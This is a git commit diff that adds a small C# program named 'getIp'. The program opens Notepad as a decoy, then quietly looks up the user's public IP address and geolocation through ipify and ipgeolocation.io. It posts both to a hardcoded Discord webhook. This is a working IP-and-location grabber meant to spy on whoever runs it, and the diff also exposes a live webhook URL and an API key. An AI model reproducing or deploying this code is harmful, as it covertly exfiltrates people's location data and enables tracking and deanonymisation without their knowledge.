2dc32e08a500e7fadf90e4f23ee8f85ed722be77
winnerdinner701 <christhegod701@gmail.com>
2023-11-27 20:35:45 +0000

    1

---
+++ getIp/getIp/Program.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+
+namespace getIp
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Process p = null;
+            try
+            {
+                p = new Process();
+                p.StartInfo.FileName = "notepad";
+                p.Start();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Exception Occurred :{0},{1}",
+                         ex.Message, ex.StackTrace.ToString());
+            }
+
+            string webhook = "https://discord.com/api/webhooks/969253375826866186/PJAjmwHVn3fDZFBLBCc9g2vQep4rux3CLgw9VqKYknpwp848wsiTBqIkyf5ctVj7lZQs";
+
+            var wbc = new WebClient();
+            var data = new NameValueCollection();
+            data["content"] = grabber.GetIp();
+            wbc.UploadValues(webhook, data);
+
+            
+
+        }
+    }
+}
---
+++ getIp/getIp/grabber.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+
+namespace getIp
+{
+    class grabber
+    {
+        public static string GetIp()
+        {
+            string ip = new WebClient().DownloadString("https://api.ipify.org");
+            string api_key = "1dc58650d7ec486f9df61e3923bcb28e";
+            string url = "https://api.ipgeolocation.io/ipgeo?apiKey=" + api_key + "&ip=" + ip;
+            string re = new WebClient().DownloadString(url);
+            return "**geolocation**: " + re + "\n**ip**: " +ip;
+        }
+    }
+}
